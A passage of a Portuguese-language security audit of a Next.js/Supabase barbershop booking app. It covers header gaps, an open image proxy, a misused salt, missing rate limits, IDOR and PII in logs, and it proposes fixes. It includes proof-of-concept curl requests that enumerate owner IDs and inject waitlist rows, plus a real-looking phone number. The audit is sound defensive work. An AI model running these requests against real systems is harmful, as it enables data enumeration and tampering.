| `X-Content-Type-Options: nosniff` | O navegador pode reinterpretar o tipo de uma resposta. |
| `Referrer-Policy` | **O caso mais concreto neste sistema:** a página `/a/[token]` tem o token de acompanhamento **na URL**. Sem `Referrer-Policy`, cada clique em um link externo dessa página envia a URL completa — token incluído — no header `Referer` para o destino. A página `/a/[token]` renderiza links para o Google Maps e para o WhatsApp da barbearia (via `AcompanharAgendamento`, componente não lido, mas os campos `shop_endereco`, `shop_telefone` e `shop_whatsapp` vêm de `agendamento_por_token` — `supabase/20_link_expira_e_rajada.sql:138-143`). |
| `Permissions-Policy` | Geolocalização é usada na busca por proximidade; nada restringe outras APIs. |

### Vetor de ataque

**Vazamento do token de acompanhamento pelo `Referer`:** a pessoa que agendou sem cadastro abre `/a/<token>`, toca em "Como chegar" ou no botão de WhatsApp. O host de destino registra `Referer: https://<site>/a/<token>`. Quem tiver acesso a esses logs pode abrir o agendamento — **e cancelá-lo** (`cancelarPorToken`, `src/app/actions/publico.ts:275`). O token é a única credencial desse fluxo: `supabase/17_agendamento_publico.sql:38-39` diz *"A pessoa guarda `/a/<token>` e por ali vê e cancela"*.

A mitigação existente é parcial e boa: a migration 20 fez o token **expirar 1 hora depois do fim do atendimento** (`token_ainda_vale`, `supabase/20_link_expira_e_rajada.sql:88-97`), o que limita a janela. Mas dentro dessa janela o cancelamento continua possível, e é justamente quando ele importa.

**Clickjacking no painel:** sem `X-Frame-Options`, uma página maliciosa embute `/painel/comissoes` num iframe transparente e induz o dono logado a clicar em "Estornar" ou "Pagar".

### Correção sugerida

Acrescentar `async headers()` em `next.config.ts` cobrindo todas as rotas:

- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY` (e `frame-ancestors 'none'` na CSP)
- `Referrer-Policy: strict-origin-when-cross-origin` — **prioridade**, porque resolve o vazamento do token com uma linha. Considerar `no-referrer` especificamente para `/a/:token`.
- `Permissions-Policy: camera=(), microphone=(), geolocation=(self)`
- `Content-Security-Policy` — a mais trabalhosa. Atenção a dois pontos deste projeto: o `<script>` inline de tema em `src/app/layout.tsx:89` exige `nonce` ou `hash`; e a CSP precisa liberar o host do Supabase (`connect-src`) e os tiles do OpenStreetMap usados pelo Leaflet (`img-src`, ver `src/components/painel/MapaLocalizacao.tsx`). Vale subir primeiro em `Content-Security-Policy-Report-Only` e ajustar com base nos relatórios.

---

## SEC-006 — O otimizador de imagens do Next aceita qualquer host HTTPS, funcionando como proxy aberto

| Campo | Valor |
|---|---|
| **Severidade** | **ALTO** — era MÉDIO na rodada 1; subiu ao se confirmar, por `npm audit`, que a biblioteca que processa estas imagens tem quatro CVEs abertas. **Leia junto com SEC-014**, que descreve a cadeia completa. |
| **Arquivo:linha** | `next.config.ts:39` |
| **Status** | CONFIRMADO |

### O que está errado

```ts
// next.config.ts:24-40
remotePatterns: [
  ...(host ? [{ protocol: "https" as const, hostname: host }] : []),
  // ⚠️ O CURINGA CONTINUA, e é decisão consciente.
  { protocol: "https", hostname: "**" },
],
```

A decisão está documentada em detalhe nas linhas 29-38, e o raciocínio de compatibilidade é legítimo: logo, capa e foto ainda aceitam URL externa digitada pelo dono, e restringir quebraria todo registro criado antes do upload existir. O comentário inclusive reconhece o custo: *"o otimizador do Next passa a poder buscar imagem de qualquer host https."*

O que o comentário **não** avalia é que o custo não recai sobre as imagens da barbearia — recai sobre a rota `/_next/image`, que passa a ser um **proxy HTTP acionável por qualquer pessoa**, sem autenticação:

```
GET /_next/image?url=https%3A%2F%2Fqualquer-host%2Fqualquer-caminho&w=1920&q=75
```

### Vetor de ataque

1. **Amplificação de banda / proxy de terceiro.** Um atacante usa o domínio do PiBarber para buscar repetidamente arquivos grandes de um alvo. O tráfego sai do IP da Vercel e é cobrado da conta do PiBarber. A conta de banda da Vercel é o dano direto.
2. **SSRF limitado.** Restrito a `https://` (o `protocol` está fixado), o que exclui `http://169.254.169.254` e metadados de nuvem por esse caminho. Mas endpoints internos servidos por HTTPS na mesma rede continuam alcançáveis, e o comportamento do otimizador (erro vs. sucesso, tempo de resposta) funciona como oráculo de existência de host.
3. **Lavagem de origem.** Conteúdo hospedado em qualquer lugar passa a ser servível a partir do domínio do PiBarber. Combinado com a ausência de CSP (SEC-005), isso amplia o alcance de um eventual XSS.

O raciocínio de que "a URL é escolhida por quem já tem permissão de escrever no registro" (comentário, linha 33) está correto para o **campo de URL da barbearia**, mas não se aplica ao **parâmetro `url` da rota `/_next/image`**, que não passa por escrita nenhuma no banco e é público.

### Correção sugerida

Duas opções, ambas mantendo as imagens existentes funcionando:

1. **Substituir o curinga por uma lista** dos hosts que de fato aparecem em `barbershops.logo_url` / `cover_url` / `professionals.avatar_url` hoje. Levantar com:
   ```sql
   select distinct split_part(split_part(logo_url,  '//', 2), '/', 1) from barbershops    where logo_url    like 'http%'
   union select distinct split_part(split_part(cover_url, '//', 2), '/', 1) from barbershops    where cover_url   like 'http%'
   union select distinct split_part(split_part(avatar_url,'//', 2), '/', 1) from professionals where avatar_url like 'http%'
   union select distinct split_part(split_part(avatar_url,'//', 2), '/', 1) from profiles      where avatar_url like 'http%';
   ```
   Provavelmente é uma lista curta (Google Drive, Imgur, Instagram CDN).
2. **Marcar as imagens de URL externa como `unoptimized`** e reservar `remotePatterns` para o host do Storage. Elas deixam de passar pelo otimizador; o curinga some junto.

O próprio comentário já aponta o gatilho da remoção — *"Se um dia o campo de URL sair, tire isto junto"*. Vale antecipar: o campo de URL é o legado, e o upload já é o caminho padrão desde `supabase/14_storage_imagens.sql`.

---

## SEC-007 — A chave de service role é usada como sal do hash de IP

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `src/app/actions/publico.ts:66-68` |
| **Status** | CONFIRMADO |

### O que está errado

```ts
// src/app/actions/publico.ts:65-68
// O sal impede que alguém com o banco na mão descubra IPs testando os 4
// bilhões possíveis — sha256 puro de um IPv4 é trivial de reverter.
const sal = process.env.SUPABASE_SERVICE_ROLE_KEY ?? "pibarber";
return createHash("sha256").update(`${sal}:${ip}`).digest("hex");
```

O raciocínio sobre **por que** salgar está certo e é bem argumentado — sha256 de um IPv4 sem sal é reversível por força bruta em minutos. O problema é a **escolha** do sal.

Três consequências:

1. **Acoplamento de segredos de gravidades diferentes.** A `SUPABASE_SERVICE_ROLE_KEY` ignora a RLS por completo — é o segredo mais grave do sistema, e o próprio `src/lib/supabase/admin.ts:11` o marca em destaque. Usá-la como sal a espalha para um contexto de baixa criticidade, aumentando a superfície onde ela pode aparecer: rastreamento de exceção, dump de heap, ferramenta de perfilamento.
2. **Rotacionar a chave zera todos os limites, em silêncio.** Trocar a service role (procedimento normal de higiene, e **obrigatório** se ela for suspeita de vazamento) muda todos os hashes. Toda contagem em `public_booking_attempts` deixa de casar com o IP correspondente, e **todos os seis limites de `book_appointment_publico` são reiniciados de uma vez** — no exato momento em que se está reagindo a um incidente. Nada na tela nem no log indica isso.
3. **O fallback silencioso.** `?? "pibarber"` faz o código funcionar com um sal público e conhecido caso a variável esteja ausente. Como `createAdminClient()` lança erro quando a variável falta (`src/lib/env.ts:30-32`), esse ramo é inalcançável na prática hoje — mas é um padrão que "falha aberto", e o valor `"pibarber"` está no código-fonte deste repositório.

### Vetor de ataque

Não é um vetor direto de exploração remota. É agravamento de impacto e falha operacional:

- **Se a service role vazar** (por log, por commit acidental, por dependência comprometida), o atacante não só ganha acesso irrestrito ao banco como também consegue reverter todos os hashes de IP de `public_booking_attempts` — obtendo o IP em claro de cada pessoa que agendou sem cadastro. O comentário do arquivo 17 justifica o hash exatamente para *"evita[r] guardar dado pessoal identificável num log que o dono da loja lê"* (`supabase/17_agendamento_publico.sql:125-129`); com este sal, essa proteção cai junto com a chave.
- **Durante a rotação da chave** (a resposta correta a esse vazamento), a proteção anti-abuso do agendamento público fica zerada e a janela é invisível.

### Correção sugerida

Usar um segredo **dedicado**: uma variável nova, por exemplo `IP_HASH_SALT`, com um valor aleatório de 32 bytes, documentada em `.env.example` como "não rotacionar sem entender que os contadores de limite serão reiniciados". Custo: uma variável de ambiente. Ganho: desacoplamento das duas rotações e uma superfície a menos para o segredo mais grave do sistema.

E **remover o fallback** `?? "pibarber"`: se o sal não estiver configurado, a função deve lançar erro, como `envServiceRole()` já faz. Um sal público não protege nada e disfarça a falta de configuração.

---

## SEC-008 — Limite de taxa existe apenas no agendamento público; as demais escritas de usuário não têm nenhum

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `supabase/20_link_expira_e_rajada.sql:348-437` (onde existe) · ausência em `src/app/actions/{booking,client,shop}.ts` |
| **Status** | CONFIRMADO (a ausência no código) / **SUSPEITA** (quanto ao limite de taxa nativo do Supabase Auth, não inspecionado) |

### O que está errado

O projeto construiu um mecanismo anti-abuso completo — tabela de tentativas, hash de IP, seis limites em janelas diferentes, honeypot no formulário — e o aplicou a **um único endpoint**: `book_appointment_publico`. As demais operações de escrita não têm nenhum controle de frequência:

| Operação | Arquivo | Autenticação | Limite |
|---|---|---|---|
| `avaliarAtendimento` | `src/app/actions/booking.ts:310` | cliente logado | nenhum |
| `entrarNaEspera` / `join_waitlist` | `src/app/actions/booking.ts:235` | cliente logado | nenhum (há dedupe por dia+período, `supabase/02_functions.sql:1046-1057`) |
| `alternarFavorito` | `src/app/actions/client.ts:367` | cliente logado | nenhum |
| `registrarVisita` (upsert em `shop_visits`) | `src/app/actions/booking.ts:274` | cliente logado | nenhum, e roda **a cada carregamento** de `/b/[slug]` |
| `salvarMeusDados`, `salvarDependente`, `salvarMeuEndereco` | `src/app/actions/client.ts` | cliente logado | nenhum |
| `entrar`, `criarConta` | `src/app/actions/auth.ts:89,150` | público | delegado ao Supabase Auth — **não verificado** |
| Reset de senha | — | público | **não existe fluxo de reset no repositório** (ver abaixo) |

**Sobre o reset de senha:** nenhuma Server Action ou página de "esqueci minha senha" foi encontrada em `src/`. A única troca de senha é `trocarSenha` (`src/app/actions/client.ts:210`), que exige sessão. Se existir recuperação, ela é feita fora deste código, pelo Supabase — e portanto não foi auditada. **Se não existir**, um cliente que perca a senha não tem caminho de volta, o que é um problema de produto além de segurança.

**Sobre `entrar` e `criarConta`:** o Supabase Auth aplica limite de taxa próprio, e o projeto **sabe disso** — `traduzirErroAuth` trata `rate limit` / `too many` explicitamente (`src/app/actions/auth.ts:51-53`). Isso é evidência de que o limite existe e foi observado. Mas **os valores efetivos não foram inspecionados**, e é por isso que este item é SUSPEITA para o caso de autenticação.

### Vetor de ataque

1. **Enchimento de dados por conta autenticada.** Criar uma conta (grátis, e o cadastro público é aberto) e disparar `alternarFavorito` ou `salvarDependente` em laço. Cada chamada é uma escrita no Postgres. Não há contador, não há bloqueio, não há alerta.
2. **`registrarVisita` como amplificador.** Ela roda em `/b/[slug]` a cada visualização de página (`src/app/b/[slug]/page.tsx:84`) e faz um `upsert` em `shop_visits`. Um cliente logado recarregando a página em laço gera uma escrita por requisição. A função falha em silêncio de propósito (linhas 292-295), então nem os erros aparecem.
3. **Poluição de avaliação.** `reviews.appointment_id` é `unique` (`supabase/01_schema.sql:375`), então cada atendimento só gera uma avaliação — essa parte está protegida. Mas o gatilho `review_after_insert()` recalcula `rating_avg` da barbearia a cada escrita (`supabase/02_functions.sql:89-114`), e `reviews_update` permite ao autor editar a própria avaliação sem limite (`supabase/03_rls.sql:411-415`) — cada edição dispara o recálculo.

O impacto é custo de infraestrutura e degradação, não vazamento. Por isso MÉDIO e não ALTO.

### Correção sugerida

1. **Verificar e endurecer o limite do Supabase Auth** no painel (Authentication → Rate Limits): tentativas de login por hora e por IP, e criação de conta por IP. É o item de maior retorno, e não exige código.
2. **Confirmar se existe fluxo de recuperação de senha.** Se não existir, é um item de produto a resolver antes do lançamento; se existir fora deste repositório, precisa de limite de taxa e não foi auditado.
3. **Generalizar `public_booking_attempts`.** A tabela e o padrão já existem e funcionam. Um limite por `auth.uid()` (que é mais confiável que IP, porque não depende de header) nas escritas de maior volume — favoritos, dependentes, visitas — reaproveita a infraestrutura pronta.
4. **Reduzir a frequência de `registrarVisita`**: só gravar se a última visita àquela loja for mais antiga que alguns minutos. Isso resolve o item 2 sem nenhum mecanismo novo, e é a mudança mais barata da lista.

---

## SEC-009 — `barbershops.owner_id` é legível por visitante anônimo

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `supabase/03_rls.sql:518` (o grant) · `supabase/01_schema.sql:136` (a coluna) · `src/lib/queries/barbearia.ts:124` (`select("*")`) |
| **Status** | CONFIRMADO |

### O que está errado

`grant select on barbershops … to anon` inclui `owner_id`, que é o `auth.users.id` do dono da barbearia:

```sql
-- supabase/01_schema.sql:136
owner_id uuid not null references profiles (id) on delete restrict,
```

O mesmo arquivo `03_rls.sql` protege essa coluna **contra escrita** com um grant por coluna e um comentário explicando o risco (linhas 533-542: *"o dono edita a loja, mas não transfere a posse"*). A proteção de leitura equivalente não existe.

Além da API, a coluna vaza pelo próprio site: `src/lib/queries/barbearia.ts:124` faz `select("*")` em `barbershops` com o cliente anônimo, e o objeto `loja` resultante é usado nas páginas públicas.

### Vetor de ataque

```bash
curl -s "$URL/rest/v1/barbershops?select=slug,name,owner_id,city" -H "apikey: $ANON"
```

Devolve o mapa completo `barbearia → uuid do dono` de toda a plataforma. Encadeando:

- Com **SEC-002**, `clientes/{owner_id}/foto-*.webp` no Storage — se o dono subiu foto de perfil pelo app do cliente, ela é obtida;
- Com **SEC-004**, cruzando com `reviews.profile_id`, descobre-se se o dono avalia barbearias concorrentes;
- Com **SEC-003**, cruzando com `professionals.profile_id`, descobre-se se o dono também está cadastrado como profissional (caso comum — o comentário de `supabase/15_comissao_do_dia.sql:135-138` diz que o dono *"também corta cabelo em boa parte das lojas"*).

`owner_id` sozinho **não é uma credencial** e não abre nada: toda policy o compara contra `auth.uid()`, que vem do JWT verificado. Por isso MÉDIO e não ALTO. O dano é a correlação e a enumeração da base de donos da plataforma.

### Correção sugerida

Incluir `barbershops` no mesmo trabalho de grant por coluna do **SEC-003**:

```sql
revoke select on barbershops from anon;
grant select (id, name, slug, description, phone, whatsapp,
              zip_code, street, number, complement, neighborhood, city, state,
              latitude, longitude, logo_url, cover_url,
              accepts_online_booking, allow_public_booking,
              min_advance_minutes, max_advance_days, cancel_deadline_hours,
              rating_avg, rating_count, is_active)
  on barbershops to anon;
```

Ficam de fora `owner_id` e `created_at`. Verificar antes se `created_at` é usado em alguma tela pública — a busca ordena por `created_at` em `my_shop_id()` (`supabase/02_functions.sql:149`), mas essa é uma função `security definer` e não depende do grant de `anon`.

Trocar também o `select("*")` de `src/lib/queries/barbearia.ts:124` por lista explícita, pelo mesmo motivo do SEC-003.

---

## SEC-016 — `join_waitlist` não confere se o profissional, o serviço e a loja combinam: dá para injetar linhas na fila de qualquer barbearia

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `supabase/02_functions.sql:1018-1068` · grant em `supabase/03_rls.sql:577` |
| **Status** | CONFIRMADO |

### O que está errado

`join_waitlist` é `security definer`, tem `grant execute … to authenticated`, e valida **três** coisas: que há sessão, que `p_shop` e `p_dia` não são nulos, e que o período está na lista permitida. Depois insere:

```sql
-- supabase/02_functions.sql:1059-1064
insert into waitlist_entries (
  barbershop_id, profile_id, professional_id, service_id, desired_date, period, status
) values (
  p_shop, auth.uid(), p_professional, p_service, p_dia, v_periodo, 'waiting'
);
```

O que ela **não** valida:

1. que `p_professional` pertence a `p_shop`;
2. que `p_service` pertence a `p_shop`;
3. que `p_shop` está **ativa** (`is_active`);
4. que `p_dia` não está no passado, nem além de `max_advance_days`.

`profile_id` vem de `auth.uid()` e não do parâmetro — isso está certo e é o que impede entrar na fila em nome de outra pessoa. A única barreira nos demais campos são as chaves estrangeiras, que garantem apenas que os uuids **existem em algum lugar** do banco, não que pertencem à mesma loja.

Compare com `book_appointment`, que na mesma situação confere explicitamente (`supabase/13_agendamento_avulso.sql:348-353`): *"O profissional precisa ser desta barbearia"*, e filtra os serviços por `s.barbershop_id = p_shop` (linha 369). O rigor existe no projeto; não foi aplicado aqui.

### Vetor de ataque

Qualquer conta de cliente (o cadastro é público e gratuito), com a chave anônima e o token da sessão:

```bash
# Ler ids de qualquer loja — tudo isso é público (03_rls.sql:518):
curl -s "$URL/rest/v1/barbershops?select=id&is_active=eq.true"      -H "apikey: $ANON"
curl -s "$URL/rest/v1/professionals?select=id,barbershop_id"        -H "apikey: $ANON"

# Injetar na fila da loja A um profissional da loja B, num dia qualquer:
curl -X POST "$URL/rest/v1/rpc/join_waitlist" \
  -H "apikey: $ANON" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"p_shop":"<LOJA_A>","p_professional":"<PROF_DA_LOJA_B>",
       "p_service":"<SERVICO_DA_LOJA_C>","p_dia":"2027-12-31","p_periodo":"any"}'
```

A tela `/painel/espera` da loja A passa a listar essa entrada — e exibe o **nome do profissional da loja B**, porque o embed de `professionals` é liberado pela policy pública (`supabase/03_rls.sql:144-150`) para qualquer profissional ativo de qualquer loja ativa.

O dedupe da função (`supabase/02_functions.sql:1046-1057`) casa por `(shop, profile, dia, período)` — então **variar o dia contorna o limite**: uma requisição por dia produz uma linha nova cada vez. Não há limite de taxa nenhum neste caminho (**SEC-008**).

### Impacto

1. **Poluição da fila de qualquer barbearia**, por qualquer pessoa com uma conta. O filtro da tela só descarta dias passados (`src/app/painel/espera/page.tsx:48`), então datas futuras se acumulam.
2. **Confusão operacional:** a fila mostra nome de profissional que não trabalha ali e serviço que a loja não oferece.
3. **Ruído no aviso automático:** quando alguém cancela, `cancel_appointment` cria notificação para todo mundo na fila daquele dia e período (`supabase/19_agendamento_de_quem_criou.sql:328-338`). Entradas injetadas passam a receber essas notificações — ou seja, o atacante se inscreve para ser avisado de vagas em lojas arbitrárias.
4. Não é vazamento: `waitlist_entries` continua fechada por `has_shop_access ∨ profile_id = auth.uid()`, e o atacante só enxerga as próprias linhas.

**Fica MÉDIO e não ALTO** porque exige conta autenticada, não expõe dado de terceiro e não move dinheiro. O efeito é sujeira e ruído — mas numa tela que **hoje já não funciona** por outro motivo (BUG-018), o que torna o problema difícil de perceber.

### Como confirmar

Executar o `curl` acima e conferir a linha:

```sql
select w.barbershop_id, w.professional_id, pr.barbershop_id as loja_do_profissional
  from waitlist_entries w join professionals pr on pr.id = w.professional_id
 where w.barbershop_id <> pr.barbershop_id;
```

Qualquer linha devolvida é uma inconsistência que o banco deveria ter recusado.

### Correção sugerida

Acrescentar em `join_waitlist`, copiando o padrão que `book_appointment` já usa:

- a loja precisa existir **e estar ativa**;
- se `p_professional` não for nulo, precisa pertencer a `p_shop` e estar ativo;
- se `p_service` não for nulo, idem;
- `p_dia` precisa estar entre hoje e `max_advance_days` da loja — hoje dá para entrar na fila de 31/12/2099.

Como reforço no schema, uma constraint composta seria ainda melhor que a validação na função: uma FK de `(barbershop_id, professional_id)` para `professionals (barbershop_id, id)` torna a inconsistência **impossível**, e não apenas recusada por uma função que alguém pode reescrever. É o mesmo raciocínio de `appointments_no_overlap` — preferir a trava física à validação de código.

---

## SEC-017 — Telefone e e-mail de clientes vazam para o log do servidor pelo tradutor de erros

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `src/lib/erros.ts:49` e `src/lib/erros.ts:125,134` |
| **Status** | CONFIRMADO (por leitura; a forma exata do campo `details` do PostgREST não foi observada em execução) |

### O que está errado

```ts
// src/lib/erros.ts:46-53
export function traduzirErroBanco(erro: ErroBanco | null | undefined, contexto?: string): string {
  if (!erro) return GENERICA;

  if (contexto) console.error(`${contexto}:`, erro);   // ← o objeto INTEIRO
```

O objeto de erro do Supabase tem quatro campos, e o tipo declarado logo acima confirma (`src/lib/erros.ts:12-17`): `message`, `code`, **`details`**, `hint`.

Para uma violação de unicidade (`23505`), o Postgres preenche `details` com **os valores que colidiram**. No formato:

```
Key (barbershop_id, phone)=(3f2a…, 11987654321) already exists.
```

E o próprio arquivo demonstra que sabe que essas colisões acontecem — a lista `UNICOS` (linhas 26-36) mapeia exatamente essas constraints para mensagens de usuário:

```ts
["customers_barbershop_id_phone", "Já existe um cliente com esse telefone nesta barbearia."],
["profiles_email",               "Já existe uma conta com este e-mail."],
```

Ou seja: **no momento em que o código reconhece "isto é um telefone duplicado" e escreve uma mensagem limpa para a tela, o telefone em claro já foi para o log** — porque o `console.error` da linha 49 roda antes de qualquer tratamento, incondicionalmente, para todo erro que passa pela função.

E `traduzirErroBanco` é chamada de **todas** as Server Actions: `salvarCliente`, `book_appointment`, `criarConta`, `salvarMeusDados` e mais de trinta outros pontos.

### Vetor

Não é remotamente explorável — não há como um atacante ler esses logs pela aplicação. É exposição de dado pessoal em um sistema secundário:

1. Na Vercel, `console.error` vai para os Runtime Logs, visíveis a **qualquer membro do projeto**, inclusive quem não deveria ter acesso a dado de cliente.
2. Se um dia entrar um agregador (Datadog, Sentry, Logtail), telefones e e-mails passam a ser copiados para um terceiro — com retenção própria e fora do inventário de dados pessoais do produto.
3. O caminho mais provável de disparo é banal: o barbeiro cadastra na aba Clientes alguém que já tem ficha. Uma operação rotineira, não um caso de borda.

Para um produto brasileiro que trata telefone e e-mail de consumidores, é tratamento de dado pessoal fora do propósito declarado — matéria de LGPD, ainda que de baixa gravidade.

### Como confirmar

Provocar uma violação de unicidade (cadastrar dois clientes com o mesmo telefone na mesma barbearia) e ler a saída de `console.error` em desenvolvimento. Se `details` trouxer o número, está confirmado. **Não observei essa saída em execução** — a afirmação vem da forma documentada do erro do Postgres, e é por isso que este achado deve ser verificado antes de ser tratado como certo.

### Correção sugerida

Registrar o que serve para depurar e **não** o que identifica alguém. Em `src/lib/erros.ts:49`, trocar o objeto inteiro por um recorte:

```ts
if (contexto) console.error(`${contexto}:`, { code: erro.code, message: erro.message });
```

`code` é o que diz o que aconteceu; `message` já vem sem valores na maioria dos casos. **`details` e `hint` são justamente os campos que carregam os dados da linha** — e são os que não deveriam ser registrados. Se `details` for útil para depuração, uma alternativa é registrá-lo apenas quando `NODE_ENV !== "production"`.

Mesmo tratamento nas linhas 125 e 134, que repetem o padrão.

---

# BAIXO

## SEC-018 — O cookie de sessão não é `Secure` e, por desenho da biblioteca, não é `httpOnly`

| Campo | Valor |
|---|---|
| **Severidade** | BAIXO (isolado) — **mas é o que define a gravidade de qualquer XSS futuro; ver SEC-005** |
| **Arquivo:linha** | `node_modules/@supabase/ssr/dist/main/utils/constants.js:4-11` (os defaults) · `src/lib/supabase/server.ts:22-31` e `src/middleware.ts:44-52` (o projeto repassa as opções sem alterar) |
| **Status** | CONFIRMADO (defaults lidos da biblioteca instalada; os headers `Set-Cookie` reais não foram observados em execução) |

### O que está errado

Os defaults de cookie do `@supabase/ssr` instalado:

```js
// node_modules/@supabase/ssr/dist/main/utils/constants.js:4-11
exports.DEFAULT_COOKIE_OPTIONS = {
    path: "/",
    sameSite: "lax",
    httpOnly: false,
    maxAge: 400 * 24 * 60 * 60,
};
```

O projeto **não altera nada disso** — `src/lib/supabase/server.ts:24-26` e `src/middleware.ts:49-51` repassam `options` verbatim, o que é o uso correto da biblioteca. Três observações:

**1. `httpOnly: false` é inerente ao desenho, não um descuido.** O cliente de navegador do `@supabase/ssr` lê e escreve a sessão por `document.cookie` (`node_modules/@supabase/ssr/dist/main/cookies.js:82,90`), e um cookie `httpOnly` seria invisível para ele. Não há como ligar isso sem trocar a arquitetura de autenticação.

**A consequência precisa ser dita por inteiro:** qualquer XSS no domínio lê o token da sessão diretamente de `document.cookie`. Não há mitigação em profundidade — e **não existe CSP** (SEC-005). Ou seja: um XSS em qualquer uma das telas se converte em tomada de conta completa, inclusive de `owner`. É por isso que a CSP, que no relatório da rodada 1 aparece como endurecimento genérico, é na verdade **a única barreira** entre um XSS e o roubo de sessão neste sistema.

**2. `secure` não está nos defaults.** O cookie não é marcado como `Secure`, então nada no protocolo impede que ele seja enviado por HTTP puro. Na Vercel o tráfego é HTTPS, mas sem `Strict-Transport-Security` (também SEC-005) uma primeira visita por `http://` ou um link `http://` acontecem e levam o cookie junto. Esta é a parte **acionável**: `Secure` pode ser ligado sem quebrar nada.

**3. `maxAge` de 400 dias.** A sessão persiste mais de um ano. Para um app de cliente é uma escolha de produto defensável; para a conta `owner`, que comanda caixa e comissões, é longo.

**`sameSite: "lax"` está correto** e é o que protege contra CSRF em requisição de terceiro.

### Correção sugerida

1. **Ligar `Secure`.** As duas chamadas de `setAll` do projeto podem acrescentar `secure: process.env.NODE_ENV === "production"` ao repassar as opções. Baixo risco, e fecha o único item realmente acionável dos três.
2. **Tratar a CSP (SEC-005) como prioridade de sessão, não de conformidade.** Com `httpOnly: false`, ela é a defesa restante contra roubo de token por XSS.
3. **Reduzir `maxAge` para a sessão do painel**, se a biblioteca permitir diferenciar. Se não permitir, registrar a decisão em vez de deixá-la implícita.

---

## SEC-010 — Assistente pode publicar resposta a avaliação pela API, contornando a restrição de tela

| Campo | Valor |
|---|---|
| **Severidade** | BAIXO |
| **Arquivo:linha** | `supabase/03_rls.sql:411-415` e `:427` (o banco permite) · `src/app/actions/shop.ts:410` (a tela exige dono) |
| **Status** | CONFIRMADO |
| **Achado gêmeo** | BUG-008 em `AUDITORIA_BUGS.md` |

A policy `reviews_update` e o trigger `reviews_guard_reply` usam `has_shop_access()`, que **inclui o assistente**. A Server Action `responderAvaliacao` usa `requireOwnerContext()`, que **não inclui**. A intenção de produto está escrita no código (`src/app/actions/shop.ts:400-402`: a resposta *"aparece publicamente em `/b/[slug]` com o nome da loja"*), e o banco não a implementa.

**Vetor:** com a sessão de um `assistant`, `PATCH /rest/v1/reviews?id=eq.<ID>` com `{"reply":"..."}` publica texto em nome da barbearia. Escalada **lateral e limitada** — o assistente já é pessoal de confiança da loja, já vê a agenda e os clientes, e não ganha acesso a nada financeiro (`transactions` e `commissions` continuam fechadas por `can_manage_money`). O dano é reputacional.

**Correção:** trocar `has_shop_access` por `can_manage_money` nas duas ocorrências, **preservando** a condição `profile_id = auth.uid()` da policy, que é o que permite ao cliente autor editar a própria avaliação.

---

## SEC-015 — Um `target="_blank"` sem `rel="noopener noreferrer"`, entre 18

| Campo | Valor |
|---|---|
| **Severidade** | BAIXO |
| **Arquivo:linha** | `src/components/admin/AdminPainel.tsx:83-84` |
| **Status** | CONFIRMADO |

Contagem no repositório: **18 ocorrências de `target="_blank"`, 17 de `noopener`.** Esta é a única exceção.

O destino é `/b/${slug}` — página do próprio site, sem terceiro para receber `window.opener` — e Chromium, Firefox e Safari aplicam `noopener` implicitamente a `target="_blank"` desde 2021. **Impacto prático: quase nulo.**

Registrado por consistência e por um motivo concreto: sem `noreferrer`, o `Referer` de `/admin` vaza para a aba nova. Irrelevante aqui, mas é o mesmo hábito que, em **SEC-005**, torna o token de `/a/[token]` vazável para hosts externos. Padrão quebrado num lugar é padrão que a próxima cópia-e-cola propaga.

**Correção:** acrescentar `rel="noopener noreferrer"` na linha 84, igual às outras 17 ocorrências.

---

## SEC-012 — Número de WhatsApp comercial real versionado em `.env.example`

| Campo | Valor |
|---|---|
| **Severidade** | BAIXO |
| **Arquivo:linha** | `.env.example:41` |
| **Status** | CONFIRMADO |

```
NEXT_PUBLIC_WHATSAPP_NUMERO=5519987704045
```

Não é um segredo — é o canal comercial, e o produto **existe para** que esse número apareça em todo CTA do site (`.env.example:34-37`). O registro é apenas para deixar consciente: um número de telefone real, versionado num repositório, é alvo de raspagem para spam e para engenharia social contra o suporte. Se o repositório for tornado público, o número entra em bases de scraping.

Vale conferir, em contrapartida, o que está **corretamente** feito no mesmo arquivo: `SUPABASE_SERVICE_ROLE_KEY` e `GOOGLE_MAPS_API_KEY` aparecem apenas como nomes vazios, com comentários explicando por que não levam `NEXT_PUBLIC_` (linhas 12-13 e 19-24). `.gitignore:7-9` cobre `.env`, `.env.local` e `.env*.local`, e a decisão de **não** ignorar `.env.example` está justificada nas linhas 12-14. **Nenhum segredo foi encontrado versionado.**

**Correção sugerida:** substituir por um valor de exemplo evidente (`55DDNNNNNNNNN`) e manter o número real apenas nas variáveis de ambiente da Vercel.

---

# Matriz de IDOR — toda Server Action que aceita um identificador do chamador

Varredura dedicada da Fase 2, **corrigida na Fase 3**. `src/app/actions/` exporta **60** Server Actions (contagem verificada: `grep -c '^export async function' src/app/actions/*.ts` → admin 2, appointments 6, auth 4, booking 7, client 13, customers 4, money 5, publico 3, services 3, shop 7, team 6). Dessas, **27 recebem um identificador vindo do payload** — que é onde IDOR mora. As outras 33 ou não recebem id nenhum, ou operam exclusivamente sobre `auth.uid()`.

> ⚠️ **Correção de honestidade.** A primeira versão desta matriz dizia "as 34 Server Actions exportadas" e omitia as três de `src/app/actions/services.ts`, um arquivo que a Fase 1 **declarou ter lido e não tinha lido**. O erro foi encontrado na Fase 3, ao conferir os números afirmados. `services.ts` foi lido, as três actions entraram na matriz abaixo, e renderam **BUG-023**. O relato de escopo dos dois documentos foi corrigido.

A pergunta em cada linha é a mesma: *"trocar este id pelo de outro tenant dá acesso?"*

| Action | Id(s) que vêm do chamador | O que autoriza | Veredito |
|---|---|---|---|
| `alternarBarbearia` | `id` da barbearia | `requireAdmin()` + service role. Admin é global por desenho | **OK** |
| `criarAgendamento` | `professionalId`, `serviceIds[]` | `shopId` vem do contexto; `book_appointment` exige prof. e serviços de `p_shop` (`13:348-370`) | **OK** |
| `concluirAgendamento` | `appointmentId` | `complete_appointment` deriva a loja do agendamento e exige `has_shop_access` (`16:126`) | **OK** |
| `cancelarAgendamento` · `cancelarMeuAgendamento` | `appointmentId` | `cancel_appointment`: equipe **ou** dono da ficha **ou** quem criou (`19:295-299`) | **OK** |
